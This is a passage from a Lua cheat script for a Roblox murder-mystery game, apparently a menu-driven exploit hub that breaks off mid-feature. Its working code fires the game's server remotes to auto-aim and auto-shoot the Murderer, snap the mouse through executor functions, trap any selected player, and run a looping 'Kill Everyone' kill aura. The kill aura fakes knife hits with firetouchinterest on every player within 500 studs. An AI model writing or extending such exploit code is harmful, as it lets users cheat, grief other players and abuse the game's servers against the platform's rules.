                local direction = (part.Position - arm.Position)
                local result = workspace:Raycast(arm.Position, direction, rayParams)
                if not result then visible = true; break end
            end
        end
        if not visible then activeMethod = "Normal" end
    end

    local predTime = _G.RanaxPredictionMultiplier or 0.125
    local flatVelocity = Vector3.new(velocity.X, 0, velocity.Z)
    local flatOffset = flatVelocity * predTime
    local clampedY = math.clamp((velocity.Y * predTime), -1.2, 1.2)
    local verticalOffset = Vector3.new(0, clampedY, 0)

    if velocity.Magnitude < 2 then
        flatOffset = Vector3.new(0, 0, 0)
        verticalOffset = Vector3.new(0, 0, 0)
    end

    local finalPredictionOffset = flatOffset + verticalOffset
    local originPos, targetPos

    if activeMethod == "New (blatant)" then
        originPos = root.Position + Vector3.new(0, 0, -0.4)
        targetPos = root.Position + (root.AssemblyLinearVelocity * 0.12)
    else
        originPos = arm.Position
        local dist = (myHRP.Position - root.Position).Magnitude
        local dropComp = Vector3.new(0, (dist / 140), 0)
        targetPos = root.Position + finalPredictionOffset + dropComp
    end

    return root, originPos, targetPos, target
end

local function fireRanaxGunV2()
    local char = LocalPlayer.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if not hum then return false, "No humanoid" end
    local gun = char:FindFirstChild("Gun") or LocalPlayer.Backpack:FindFirstChild("Gun")
    if not gun then return false, "No Gun tool" end
    local root, originPos, targetPos, target = getRanaxCombatDataV2()
    if root and originPos and targetPos then
        if gun.Parent ~= char then hum:EquipTool(gun) end
        local remote = gun:FindFirstChild("Shoot") or ReplicatedStorage:FindFirstChild("ShootGun")
        if remote then
            remote:FireServer(CFrame.lookAt(originPos, targetPos), CFrame.new(targetPos))

            -- Hook kill detection for Cinematic Kill Cam & Visual Effects
            if target and target.Character then
                local tHum = target.Character:FindFirstChildOfClass("Humanoid")
                local tRoot = target.Character:FindFirstChild("HumanoidRootPart")
                if tHum and tHum.Health > 0 and tRoot then
                    local impactPos = targetPos
                    local distStuds = math.floor((originPos - targetPos).Magnitude)
                    local shotTime = os.clock()
                    local dConn
                    dConn = tHum.Died:Connect(function()
                        if dConn then dConn:Disconnect(); dConn = nil end
                        if (os.clock() - shotTime) <= 2.8 then
                            triggerCinematicKill(target, tRoot and tRoot.Position or impactPos, distStuds)
                        end
                    end)
                    task.spawn(function()
                        local startCheck = os.clock()
                        while (os.clock() - startCheck) < 2.5 do
                            if not (target and target.Character and tHum and tHum.Parent) or tHum.Health <= 0 then
                                if dConn then dConn:Disconnect(); dConn = nil end
                                triggerCinematicKill(target, tRoot and tRoot.Position or impactPos, distStuds)
                                break
                            end
                            task.wait(0.04)
                        end
                        if dConn then dConn:Disconnect(); dConn = nil end
                    end)
                end
            end

            return true, target and target.Name or "target"
        end
        return false, "Shoot remote not found"
    end
    return false, "No Murderer found"
end


-- ==================== CINEMATIC SHERIFF KILL CAM & EFFECT ENGINE ====================
_G.SheriffKillCamEnabled = true
_G.SheriffKillSound = true
_G.SheriffKillBanner = true
_G.SheriffKillCamDuration = 1.8
_G.SheriffKillEffectStyle = "All Combined"
local _killCamActive = false

local function playKillSound()
    pcall(function()
        local s = Instance.new("Sound")
        s.SoundId = "rbxassetid://8526543415" -- Crisp AAA kill confirmation ding
        s.Volume = 2.0
        s.Parent = Workspace
        s:Play()
        task.delay(3, function() pcall(function() s:Destroy() end) end)
    end)
end

local function spawnKillWorldEffects(hitPos)
    pcall(function()
        local style = _G.SheriffKillEffectStyle or "All Combined"
        local parent = Workspace:FindFirstChild("Terrain") or Workspace

        -- 1) Celestial Lightning Strike
        if style == "Celestial Lightning" or style == "All Combined" then
            local topPos = hitPos + Vector3.new(0, 90, 0)
            local dist = (topPos - hitPos).Magnitude
            local beam = Instance.new("Part")
            beam.Name = "RanaxLightningBolt"
            beam.Anchored = true
            beam.CanCollide = false
            beam.CanTouch = false
            beam.CanQuery = false
            beam.Material = Enum.Material.Neon
            beam.Color = Color3.fromRGB(0, 235, 255)
            beam.Size = Vector3.new(1.2, dist, 1.2)
            beam.CFrame = CFrame.lookAt((topPos + hitPos) / 2, hitPos) * CFrame.Angles(math.rad(90), 0, 0)
            beam.Parent = parent

            TweenService:Create(beam, TweenInfo.new(0.55, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                Transparency = 1,
                Size = Vector3.new(0.1, dist, 0.1)
            }):Play()
            task.delay(0.6, function() pcall(function() beam:Destroy() end) end)
        end

        -- 2) Neon Shockwave Ring
        if style == "Neon Shockwave" or style == "All Combined" then
            local ring = Instance.new("Part")
            ring.Name = "RanaxKillShockwave"
            ring.Shape = Enum.PartType.Cylinder
            ring.Anchored = true
            ring.CanCollide = false
            ring.CanTouch = false
            ring.CanQuery = false
            ring.Material = Enum.Material.Neon
            ring.Color = Color3.fromRGB(255, 215, 0)
            ring.Size = Vector3.new(0.4, 2, 2)
            ring.CFrame = CFrame.new(hitPos) * CFrame.Angles(0, 0, math.rad(90))
            ring.Parent = parent

            TweenService:Create(ring, TweenInfo.new(0.75, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
                Size = Vector3.new(0.2, 28, 28),
                Transparency = 1
            }):Play()
            task.delay(0.8, function() pcall(function() ring:Destroy() end) end)
        end

        -- 3) Sparks Burst Emitter
        local att = Instance.new("Attachment")
        att.WorldPosition = hitPos
        att.Parent = parent

        local emitter = Instance.new("ParticleEmitter")
        emitter.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 240, 100)),
            ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 120, 0)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 30, 30))
        })
        emitter.Size = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 0.6),
            NumberSequenceKeypoint.new(1, 0)
        })
        emitter.LightEmission = 1
        emitter.LightInfluence = 0
        emitter.Speed = NumberRange.new(20, 45)
        emitter.SpreadAngle = Vector2.new(180, 180)
        emitter.Lifetime = NumberRange.new(0.5, 0.9)
        emitter.Rate = 0
        emitter.Parent = att
        emitter:Emit(45)

        task.delay(1.2, function()
            pcall(function() att:Destroy() end)
        end)
    end)
end

local function showKillBannerUI(targetName, dist)
    pcall(function()
        local coreOk, coreGui = pcall(function() return (typeof(gethui) == "function" and gethui()) or game:GetService("CoreGui") end)
        local targetParent = (coreOk and coreGui) or LocalPlayer:WaitForChild("PlayerGui")

        local oldGui = targetParent:FindFirstChild("RanaxKillBannerGui")
        if oldGui then pcall(function() oldGui:Destroy() end) end

        local sg = Instance.new("ScreenGui")
        sg.Name = "RanaxKillBannerGui"
        sg.ResetOnSpawn = false
        sg.DisplayOrder = 9999
        sg.Parent = targetParent

        -- Flash vignette
        local vig = Instance.new("Frame")
        vig.Size = UDim2.new(1, 0, 1, 0)
        vig.BackgroundColor3 = Color3.fromRGB(255, 40, 40)
        vig.BackgroundTransparency = 0.75
        vig.BorderSizePixel = 0
        vig.Parent = sg

        TweenService:Create(vig, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
            BackgroundTransparency = 1
        }):Play()

        -- Banner frame
        local banner = Instance.new("Frame")
        banner.Size = UDim2.new(0, 380, 0, 75)
        banner.Position = UDim2.new(0.5, -190, 0.12, -40)
        banner.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
        banner.BackgroundTransparency = 0.25
        banner.BorderSizePixel = 0
        banner.Parent = sg

        local uic = Instance.new("UICorner")
        uic.CornerRadius = UDim.new(0, 10)
        uic.Parent = banner

        local uis = Instance.new("UIStroke")
        uis.Color = Color3.fromRGB(255, 215, 0)
        uis.Thickness = 2
        uis.Transparency = 0.2
        uis.Parent = banner

        local t1 = Instance.new("TextLabel")
        t1.Size = UDim2.new(1, 0, 0, 36)
        t1.Position = UDim2.new(0, 0, 0, 6)
        t1.BackgroundTransparency = 1
        t1.Font = Enum.Font.GothamBold
        t1.Text = "★ MURDERER ELIMINATED ★"
        t1.TextColor3 = Color3.fromRGB(255, 225, 60)
        t1.TextSize = 19
        t1.TextStrokeTransparency = 0.3
        t1.Parent = banner

        local t2 = Instance.new("TextLabel")
        t2.Size = UDim2.new(1, 0, 0, 24)
        t2.Position = UDim2.new(0, 0, 0, 40)
        t2.BackgroundTransparency = 1
        t2.Font = Enum.Font.GothamMedium
        t2.Text = string.format("Victim: %s   •   Distance: %dm", tostring(targetName or "Target"), tonumber(dist) or 0)
        t2.TextColor3 = Color3.fromRGB(220, 220, 230)
        t2.TextSize = 13
        t2.TextStrokeTransparency = 0.5
        t2.Parent = banner

        -- Slide-down animation
        banner.Position = UDim2.new(0.5, -190, 0.08, -50)
        TweenService:Create(banner, TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
            Position = UDim2.new(0.5, -190, 0.12, 0)
        }):Play()

        task.delay(1.6, function()
            if banner and banner.Parent then
                TweenService:Create(banner, TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
                    Position = UDim2.new(0.5, -190, 0.08, -50),
                    BackgroundTransparency = 1
                }):Play()
                TweenService:Create(t1, TweenInfo.new(0.3), { TextTransparency = 1 }):Play()
                TweenService:Create(t2, TweenInfo.new(0.3), { TextTransparency = 1 }):Play()
            end
        end)

        task.delay(2.1, function()
            pcall(function() sg:Destroy() end)
        end)
    end)
end

local function triggerCinematicKill(victimPlayer, hitPos, dist)
    if _killCamActive then return end
    _killCamActive = true

    local victimName = victimPlayer and victimPlayer.Name or "Murderer"
    local cam = Workspace.CurrentCamera

    -- 1) Play Kill Sound Confirm
    if _G.SheriffKillSound ~= false then
        playKillSound()
    end

    -- 2) Spawn Flashy Particle & Lighting Effects in World
    spawnKillWorldEffects(hitPos)

    -- 3) Display Kill Banner & Vignette
    if _G.SheriffKillBanner ~= false then
        showKillBannerUI(victimName, dist)
    end

    -- 4) Cinematic Matrix Slow-Motion Kill Cam
    if _G.SheriffKillCamEnabled ~= false and cam then
        task.spawn(function()
            local origCamCF = cam.CFrame
            local origSubject = cam.CameraSubject
            local origFOV = cam.FieldOfView
            local duration = tonumber(_G.SheriffKillCamDuration) or 1.8
            local startTime = os.clock()

            local angle = 0
            local orbitDist = 11
            local camHeight = 3.5

            -- Slow-motion orbit around the falling murderer
            while (os.clock() - startTime) < duration do
                local elapsed = os.clock() - startTime
                angle = angle + 0.04
                local camOffset = Vector3.new(math.sin(angle) * orbitDist, camHeight, math.cos(angle) * orbitDist)
                local targetCamPos = hitPos + camOffset
                local targetCamCF = CFrame.lookAt(targetCamPos, hitPos)

                cam.CameraType = Enum.CameraType.Scriptable
                cam.CFrame = targetCamCF
                cam.FieldOfView = math.clamp(origFOV - (elapsed * 8), 50, origFOV)
                RunService.RenderStepped:Wait()
            end

            -- Smooth return to player
            local returnStart = os.clock()
            local returnDuration = 0.35
            local apexCF = cam.CFrame
            local myChar = LocalPlayer.Character
            local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
            local myHum = myChar and myChar:FindFirstChildOfClass("Humanoid")

            while (os.clock() - returnStart) < returnDuration do
                local alpha = (os.clock() - returnStart) / returnDuration
                local freshMyCF = (myHRP and myHRP.CFrame * CFrame.new(0, 2, 7)) or origCamCF
                cam.CFrame = apexCF:Lerp(freshMyCF, alpha ^ 0.6)
                cam.FieldOfView = 50 + ((origFOV - 50) * alpha)
                RunService.RenderStepped:Wait()
            end

            cam.CameraType = Enum.CameraType.Custom
            if myHum then cam.CameraSubject = myHum end
            cam.FieldOfView = origFOV
            _killCamActive = false
        end)
    else
        task.delay(1.5, function() _killCamActive = false end)
    end
end
_G.triggerCinematicKill = triggerCinematicKill

-- ==================== SHERIFF TAB UI ====================
task.wait()
local SheriffTab = Window:Tab({
    Title = "Sheriff",
    Icon = "crosshair",
    Locked = false,
})

SheriffTab:Section({
    Title = "Shoot",
    TextSize = 15
})

local ShootV2Keybind
ShootV2Keybind = SheriffTab:Keybind({
    Title = "Shoot Keybind",
    Desc = "Fires predicted shot at Murderer (Press Delete for None)",
    Value = KeybindValues.ShootV2Keybind or "Q",
    Callback = function(Value)
        KeybindValues.ShootV2Keybind = tostring(Value):gsub("Enum.KeyCode.", "")
        if tostring(Value) == "Delete" or tostring(Value) == "Backspace" or tostring(Value) == "None" or Value == nil then
            pcall(function() if ShootV2Keybind and ShootV2Keybind.SetValue then ShootV2Keybind:SetValue("None") end end)
            return
        end
        task.spawn(function()
            local ok, targetName
            if _G.ShootV2FlickEnabled then
                ok, targetName = executeRanaxFlickShoot()
            else
                ok, targetName = fireRanaxGunV2()
            end
            if ok then
                notify("Sheriff", "Shot Murderer: " .. tostring(targetName), 2, "crosshair")
            end
        end)
    end,
})
UIElements.ShootV2Keybind = ShootV2Keybind

SheriffTab:Button({
    Title = "Shoot",
    Desc = "Fires one predicted shot at the Murderer",
    Locked = false,
    Callback = function()
        task.spawn(function()
            local ok, targetName = fireRanaxGunV2()
            if ok then
                notify("Sheriff", "Shot Murderer: " .. tostring(targetName), 2, "crosshair")
            else
                notify("Sheriff", "Failed: " .. tostring(targetName), 2, "x")
            end
        end)
    end
})

UIElements.ShootingMethod = SheriffTab:Dropdown({
    Title = "Shoot Method",
    Desc = "Method of trajectory prediction",
    Values = {"New (blatant)", "Normal"},
    Value = _G.RanaxShootingMethod or "New (blatant)",
    Multi = false,
    AllowNone = false,
    Callback = function(opt)
        _G.RanaxShootingMethod = opt
        notify("Sheriff", "Method: " .. tostring(opt), 2)
    end
})

UIElements.ShootV2WallCheck = SheriffTab:Toggle({
    Title = "Wall Check",
    Desc = "Raycast wall check between arm and target",
    Icon = "shield-check",
    Type = "Checkbox",
    Value = _G.RanaxSilentAimWallCheck or false,
    Callback = function(val)
        _G.RanaxSilentAimWallCheck = val
        notify("Sheriff", "Wall Check " .. (val and "ON" or "OFF"), 2)
    end
})

UIElements.ShootV2PredictMultiplier = SheriffTab:Slider({
    Title = "Prediction Multiplier",
    Desc = "Lead prediction timing (Ranax default: 0.125)",
    Step = 0.005,
    Value = {
        Min = 0.01,
        Max = 0.50,
        Default = _G.RanaxPredictionMultiplier or 0.125,
    },
    Callback = function(val)
        _G.RanaxPredictionMultiplier = val
    end
})

UIElements.AutoShootV2 = SheriffTab:Toggle({
    Title = "Auto Shoot",
    Desc = "Continuously fires gun whenever Murderer exists and gun is available",
    Icon = "flame",
    Type = "Checkbox",
    Value = false,
    Callback = function(val)
        _G.RanaxAutoShootV2 = val
        if val then
            task.spawn(function()
                while _G.RanaxAutoShootV2 do
                    pcall(function() fireRanaxGunV2() end)
                    task.wait(0.1)
                end
            end)
        end
        notify("Sheriff", "Auto Shoot " .. (val and "ON" or "OFF"), 2)
    end
})

SheriffTab:Divider()

-- ==================== FLICK SHOOT V2 (RANAX ENGINE FLICK) ====================
_G.ShootV2FlickEnabled = false
_G.ShootV2FlickCamera = false
_G.ShootV2FlickTurnTime = 0.08
local flickV2InProgress = false

local function moveMouseToWorld(worldPos)
    local cam = Workspace.CurrentCamera
    if not cam then return false end
    local screenPos, onScreen = cam:WorldToViewportPoint(worldPos)
    local x = onScreen and math.floor(screenPos.X) or math.floor(cam.ViewportSize.X / 2)
    local y = onScreen and math.floor(screenPos.Y) or math.floor(cam.ViewportSize.Y / 2)
    if typeof(mousemoveabs) == "function" then
        pcall(function() mousemoveabs(x, y) end)
        return true
    end
    pcall(function()
        if VirtualInputManager then
            VirtualInputManager:SendMouseMoveEvent(x, y, game)
        end
    end)
    return true
end

executeRanaxFlickShoot = function()
    if flickV2InProgress then return false, "Flick in progress" end
    local char = LocalPlayer.Character
    local myHRP = char and char:FindFirstChild("HumanoidRootPart")
    local myHum = char and char:FindFirstChildOfClass("Humanoid")
    if not (char and myHRP and myHum) then return false, "Character not ready" end

    local root, originPos, targetPos, target = getRanaxCombatDataV2()
    if not (root and originPos and targetPos) then return false, "No target found" end

    flickV2InProgress = true
    local origCFrame   = myHRP.CFrame
    local origCameraCF = Workspace.CurrentCamera and Workspace.CurrentCamera.CFrame
    local savedAutoRotate = myHum.AutoRotate
    myHum.AutoRotate = false

    local holdTime  = tonumber(_G.ShootV2FlickTurnTime) or 0.08
    local steps     = math.max(4, math.floor(holdTime / 0.016))   -- ~60 fps steps
    local flatTarget = Vector3.new(targetPos.X, myHRP.Position.Y, targetPos.Z)
    local aimCFrame  = CFrame.lookAt(myHRP.Position, flatTarget)

    --  Ease-IN: smooth rotation from current → aim 
    for i = 1, steps do
        if not (myHRP and myHRP.Parent) then break end
        local alpha = (i / steps) ^ 0.6   -- slight ease-in curve (feels like a real flick)
        local newRot = origCFrame:Lerp(aimCFrame, alpha)
        myHRP.CFrame = CFrame.new(myHRP.Position) * newRot.Rotation

        if _G.ShootV2FlickCamera and Workspace.CurrentCamera then
            pcall(function()
                local camAim = CFrame.lookAt(Workspace.CurrentCamera.CFrame.Position, targetPos)
                Workspace.CurrentCamera.CFrame = origCameraCF:Lerp(camAim, alpha)
            end)
            pcall(function()
                moveMouseToWorld(targetPos)
            end)
        end
        task.wait()
    end

    --  Camera & Mouse snap to target at peak
    if _G.ShootV2FlickCamera then
        pcall(function()
            moveMouseToWorld(targetPos)
        end)
    end

    --  Fire at peak of flick 
    local ok, res = fireRanaxGunV2()

    --  Brief hold at peak so the shot registers 
    task.wait(0.04)

    --  Ease-OUT: smoothly return to original orientation 
    local peakCFrame       = myHRP.CFrame
    local peakCameraCF     = Workspace.CurrentCamera and Workspace.CurrentCamera.CFrame
    local returnSteps      = math.max(3, math.floor(steps * 0.7))
    for i = 1, returnSteps do
        if not (myHRP and myHRP.Parent) then break end
        local alpha = (i / returnSteps) ^ 1.4  -- ease-out (decelerates back)
        local newRot = peakCFrame:Lerp(origCFrame, alpha)
        myHRP.CFrame = CFrame.new(myHRP.Position) * newRot.Rotation

        if _G.ShootV2FlickCamera and Workspace.CurrentCamera and peakCameraCF and origCameraCF then
            pcall(function()
                Workspace.CurrentCamera.CFrame = peakCameraCF:Lerp(origCameraCF, alpha)
            end)
        end
        task.wait()
    end

    pcall(function() myHum.AutoRotate = savedAutoRotate end)
    flickV2InProgress = false

    return ok, res
end

SheriffTab:Section({
    Title = "Flick Shoot",
    TextSize = 15
})

UIElements.ShootV2FlickToggle = SheriffTab:Toggle({
    Title = "Flick Shoot",
    Desc = "Snaps character to Murderer to fire gun and returns smoothly",
    Icon = "refresh-cw",
    Type = "Checkbox",
    Value = _G.ShootV2FlickEnabled,
    Callback = function(state)
        _G.ShootV2FlickEnabled = state
        notify("Flick", "Flick Shoot " .. (state and "ON" or "OFF"), 2)
    end
})

UIElements.ShootV2FlickCamera = SheriffTab:Toggle({
    Title = "Flick Camera Snap",
    Desc = "Rotates camera to face Murderer during flick",
    Icon = "camera",
    Type = "Checkbox",
    Value = _G.ShootV2FlickCamera,
    Callback = function(state)
        _G.ShootV2FlickCamera = state
        notify("Flick", "Camera Snap " .. (state and "ON" or "OFF"), 2, "camera")
    end
})

SheriffTab:Button({
    Title = "Flick Shoot",
    Desc = "Performs a single snap and shot on the Murderer",
    Locked = false,
    Callback = function()
        task.spawn(function()
            local ok, res = executeRanaxFlickShoot()
            if ok then
                notify("Flick", "Flick Shot: " .. tostring(res), 2, "zap")
            else
                notify("Flick", "Failed: " .. tostring(res), 2, "x")
            end
        end)
    end
})

local FlickV2Keybind
FlickV2Keybind = SheriffTab:Keybind({
    Title = "Flick Shoot Keybind",
    Desc = "Performs Flick Shoot on key press (Press Delete for None)",
    Value = KeybindValues.FlickV2Keybind or "None",
    Callback = function(Value)
        KeybindValues.FlickV2Keybind = tostring(Value):gsub("Enum.KeyCode.", "")
        if tostring(Value) == "Delete" or tostring(Value) == "Backspace" or tostring(Value) == "None" or Value == nil then
            pcall(function() if FlickV2Keybind and FlickV2Keybind.SetValue then FlickV2Keybind:SetValue("None") end end)
            return
        end
        task.spawn(function()
            local ok, res = executeRanaxFlickShoot()
            if ok then
                notify("Flick", "Flick Shot: " .. tostring(res), 2, "zap")
            end
        end)
    end,
})
UIElements.FlickV2Keybind = FlickV2Keybind


SheriffTab:Divider()
SheriffTab:Section({ Title = "Cinematic Kill Highlight", TextSize = 15 })

UIElements.SheriffKillCam = SheriffTab:Toggle({
    Title = "Cinematic Kill Cam",
    Desc = "Slow-motion Matrix highlight camera that orbits the falling Murderer",
    Default = _G.SheriffKillCamEnabled ~= false,
    Callback = function(v) _G.SheriffKillCamEnabled = v end
})

UIElements.SheriffKillSound = SheriffTab:Toggle({
    Title = "Kill Confirmation Sound",
    Desc = "Plays a crisp AAA hitmarker sound when eliminating the Murderer",
    Default = _G.SheriffKillSound ~= false,
    Callback = function(v) _G.SheriffKillSound = v end
})

UIElements.SheriffKillBanner = SheriffTab:Toggle({
    Title = "Victory Kill Banner",
    Desc = "Displays glowing Murderer Eliminated notification banner and vignette",
    Default = _G.SheriffKillBanner ~= false,
    Callback = function(v) _G.SheriffKillBanner = v end
})

UIElements.SheriffKillEffectStyle = SheriffTab:Dropdown({
    Title = "Kill World Effect",
    Desc = "Visual effect spawned at the Murderer's death location",
    Values = { "All Combined", "Celestial Lightning", "Neon Shockwave" },
    Value = _G.SheriffKillEffectStyle or "All Combined",
    Callback = function(v) _G.SheriffKillEffectStyle = tostring(v) end
})

UIElements.SheriffKillCamDuration = SheriffTab:Slider({
    Title = "Kill Cam Duration",
    Desc = "How long the slow-motion kill cam stays focused on the Murderer",
    Step = 0.1,
    Value = {
        Min = 1.0,
        Max = 3.5,
        Default = _G.SheriffKillCamDuration or 1.8,
    },
    Callback = function(v) _G.SheriffKillCamDuration = v end
})

UIElements.ShootV2FlickTurnTime = SheriffTab:Slider({
    Title = "Flick Turn Duration",
    Desc = "Time character stays facing target before returning",
    Step = 0.01,
    Value = {
        Min = 0.01,
        Max = 0.50,
        Default = 0.08,
    },
    Callback = function(val)
        _G.ShootV2FlickTurnTime = val
    end
})

-------------------------------------------------------------------------------------------------------------------
task.wait()
local MurdererTab = Window:Tab({
    Title = "Murderer",
    Icon = "target",
    Locked = false,
})

local SelectedPlayer = nil

local function GetPlayerList()
    local names = {}
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer then
            table.insert(names, plr.Name)
        end
    end
    if #names == 0 then
        names = {"No players"}
    end
    return names
end

local PlayerDropdown = MurdererTab:Dropdown({
    Title = "Player Dropdown",
    Desc = "Select a player to trap",
    Values = GetPlayerList(),
    Value = GetPlayerList()[1] or "No players",
    Multi = false,
    AllowNone = false,
    Callback = function(option)
        SelectedPlayer = Players:FindFirstChild(option)
    end
})

Players.PlayerAdded:Connect(function()
    task.wait(0.5)
    pcall(function() PlayerDropdown:Refresh(GetPlayerList()) end)
end)

Players.PlayerRemoving:Connect(function()
    task.wait(0.5)
    pcall(function() PlayerDropdown:Refresh(GetPlayerList()) end)
    if SelectedPlayer and not SelectedPlayer.Parent then
        SelectedPlayer = nil
    end
end)

local TrapPlayerButton = MurdererTab:Button({
    Title = "Trap selected Player",
    Desc = "Traps / Freezes the selected player for a few seconds",
    Locked = false,
    Callback = function()
        if not SelectedPlayer or SelectedPlayer == "No players" then
            WindUI:Notify({
                Title = "No player selected",
                Content = "Please select a player from the dropdown",
                Duration = 3,
                Icon = "x"
            })
            return
        end
        
        if not SelectedPlayer.Character then
            WindUI:Notify({
                Title = "Player not spawned",
                Content = "Selected player has no character",
                Duration = 3,
                Icon = "x"
            })
            return
        end
        
        if IsFriend(SelectedPlayer) or isProtected(SelectedPlayer) then
            WindUI:Notify({
                Title = "Friend Protected",
                Content = "Cannot trap a whitelisted friend!",
                Duration = 3,
                Icon = "shield"
            })
            return
        end
        
        local targetHRP = SelectedPlayer.Character:FindFirstChild("HumanoidRootPart")
        if not targetHRP then
            WindUI:Notify({
                Title = "Cannot trap",
                Content = "Player has no HumanoidRootPart",
                Duration = 3,
                Icon = "x"
            })
            return
        end
        
        local args = {
            targetHRP.CFrame
        }
        
        local trap = LocalPlayer.Character:FindFirstChild("Trap")
        if trap then
            local activate = trap:FindFirstChild("Activate")
            if activate then
                activate:FireServer(unpack(args))
            end
        end
    end
})

MurdererTab:Divider()



-- Lobi tespiti: oyuncu lobide mi, map iÃ§inde mi?
IsPlayerInLobby = function(plr)
    if not plr or not plr.Character then return true end
    local root = plr.Character:FindFirstChild("HumanoidRootPart")
    if not root then return true end

    -- (FPS FIX: Distance to lobby geometry is used, no heavy coin scanning)

    local lobby = workspace:FindFirstChild("RegularLobby") or workspace:FindFirstChild("Lobby")
    if lobby then
        local p = lobby:GetPivot().Position
        if (root.Position - p).Magnitude < 130 then
            return true
        end
    end

    for _, name in ipairs({"LobbyMap", "Staging", "Waiting Area", "LobbyArea"}) do
        local obj = workspace:FindFirstChild(name)
        if obj then
            local p = obj:IsA("BasePart") and obj.Position
                or (obj:FindFirstChildWhichIsA("SpawnLocation") and obj:FindFirstChildWhichIsA("SpawnLocation").Position)
            if p and (root.Position - p).Magnitude < 130 then
                return true
            end
        end
    end
    return false
end

local function triggerKnifeKillAuraHit(knife, troot)
    if not knife or not troot then return end
    pcall(function()
        knife:Activate()
        local handle = knife:FindFirstChild("Handle") or knife:FindFirstChildWhichIsA("BasePart")
        if handle and typeof(firetouchinterest) == "function" then
            firetouchinterest(troot, handle, 0)
            firetouchinterest(troot, handle, 1)
        end
        local events = knife:FindFirstChild("Events")
        if events then
            local stab = events:FindFirstChild("KnifeStabbed")
            local touched = events:FindFirstChild("HandleTouched")
            if stab then stab:FireServer("Slash") end
            if touched then touched:FireServer(troot) end
        else
            local stab = knife:FindFirstChild("KnifeStabbed") or knife:FindFirstChild("Slash") or knife:FindFirstChild("Stab")
            local touched = knife:FindFirstChild("HandleTouched")
            if stab and stab:IsA("RemoteEvent") then stab:FireServer("Slash") end
            if touched and touched:IsA("RemoteEvent") then touched:FireServer(troot) end
        end
    end)
end
_G.triggerKnifeKillAuraHit = triggerKnifeKillAuraHit

ExecuteKillEveryone = function(customRange)
    local char = LocalPlayer.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if not char or not root or not hum or hum.Health <= 0 then return 0, "Character not ready" end

    -- Equip knife from Character or Backpack
    local knife = char:FindFirstChildOfClass("Tool")
    if not knife or not (knife.Name:lower():find("knife") or knife.Name:lower():find("blade") or knife.Name:lower():find("sword") or knife:FindFirstChild("Handle")) then
        knife = nil
        for _, t in ipairs(char:GetChildren()) do
            if t:IsA("Tool") and (t.Name:lower():find("knife") or t.Name:lower():find("blade") or t.Name:lower():find("sword") or t:FindFirstChild("Handle")) then
                knife = t
                break
            end
        end
    end
    if not knife then
        for _, t in ipairs(LocalPlayer.Backpack:GetChildren()) do
            if t:IsA("Tool") and (t.Name:lower():find("knife") or t.Name:lower():find("blade") or t.Name:lower():find("sword") or t:FindFirstChild("Handle")) then
                knife = t
                if hum then hum:EquipTool(knife) end
                break
            end
        end
    end

    if not knife then
        return 0, "You need a Knife / Murderer role to Kill Everyone!"
    end
    if knife.Parent ~= char and hum then hum:EquipTool(knife) end

    local myPos = root.Position
    local maxRange = customRange or 500  -- Kill Aura 500 Studs Range!
    local count = 0

    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer and plr.Character and not IsFriend(plr) and not isProtected(plr) then
            local tChar = plr.Character
            local tHum = tChar:FindFirstChildOfClass("Humanoid")
            local tRoot = tChar:FindFirstChild("HumanoidRootPart")
            
            if tHum and tHum.Health > 0 and tRoot and not IsPlayerInLobby(plr) then
                local dist = (tRoot.Position - myPos).Magnitude
                if dist <= maxRange then
                    -- Execute KillAura hit directly without teleporting!
                    triggerKnifeKillAuraHit(knife, tRoot)
                    count = count + 1
                end
            end
        end
    end
    return count
end
_G.ExecuteKillEveryone = ExecuteKillEveryone

local KillEveryoneToggle = MurdererTab:Toggle({
    Title = "Kill Everyone",
    Desc = "Automatically kills everyone on the map (skips lobby)",
    Icon = "skull",
    Type = "Checkbox",
    Value = false,
    Callback = function(state)
        getgenv().KillEveryoneActive = state
        if state then
            task.spawn(function()
                while getgenv().KillEveryoneActive do
                    pcall(function()
                        ExecuteKillEveryone(500)
                    end)
                    task.wait(0.06)
                end
            end)
        end
    end
})

local KillEveryoneButton = MurdererTab:Button({
    Title = "Kill Everyone",
    Desc = "Kills everyone on the map (skips lobby)",
    Locked = false,
    Callback = function()
        task.spawn(function()
            local count, err = ExecuteKillEveryone()
            if err then
                notify("Kill Everyone", tostring(err), 3, "x")
            end
        end)
    end
})

local KillEveryoneKeybind
KillEveryoneKeybind = MurdererTab:Keybind({
    Title = "Kill Everyone Keybind",
    Desc = "Eliminates everyone on the map when pressed (Press Delete for None)",
    Value = KeybindValues.KillEveryoneKeybind or "None",
    Callback = function(v)
        KeybindValues.KillEveryoneKeybind = tostring(v):gsub("Enum.KeyCode.", "")
        if tostring(v) == "Delete" or tostring(v) == "Backspace" or tostring(v) == "None" or v == nil then
            pcall(function() if KillEveryoneKeybind and KillEveryoneKeybind.SetValue then KillEveryoneKeybind:SetValue("None") end end)
            return
        end
        task.spawn(function()
            local count, err = ExecuteKillEveryone()
            if err then
                notify("Kill Everyone", tostring(err), 3, "x")
            end
        end)
    end
})
UIElements.KillEveryoneKeybind = KillEveryoneKeybind

-------------------------------------------------------------------------------------------------------------------
do
    task.wait()
local MapTab = Window:Tab({
        Title = "Map",
        Icon = "map",
        Locked = false,
    })

    -- ==================== X-RAY MODE (TRANSPARENT WALLS) ====================
    _G.RanaxXrayActive = false

    local function setMapXray(state)
        _G.RanaxXrayActive = state
        for _, mapCandidate in pairs(workspace:GetChildren()) do
            if mapCandidate:IsA("Model") and mapCandidate:FindFirstChildWhichIsA("BasePart", true) then
                local basePartCount = 0
                for _, desc in pairs(mapCandidate:GetDescendants()) do
                    if desc:IsA("BasePart") then
                        basePartCount = basePartCount + 1
